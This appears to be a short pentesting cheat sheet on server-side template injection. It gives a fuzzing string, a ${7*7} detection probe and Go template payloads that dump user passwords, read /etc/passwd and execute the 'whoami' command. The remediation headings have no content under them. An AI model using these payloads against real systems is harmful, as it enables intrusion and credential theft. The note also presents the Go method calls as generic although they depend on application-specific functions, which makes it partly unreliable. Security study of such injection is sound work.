# Resource for more complicated payloads: https://github.com/swisskyrepo/PayloadsAllTheThings

# https://book.hacktricks.xyz/

## Payloads Fuzzing: ${{<%'"}}%

## PoC Payload for Identification: ${7*7}

## Explaining further about more template engines here: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Remediation:

### 1: Secure methods

### 2: Sanitization

## Example payloads:

## Go SSTI

### 1) {{ .Password }} (Fetches the passwords of all users)

### 2) {{ .GetFile "/etc/passwd" }} (Gets the passwd linux file)

### 3) {{ .ExecuteCmd "whoami" }} Executes commands

### 4) {{ . }} (Fetches all data available)
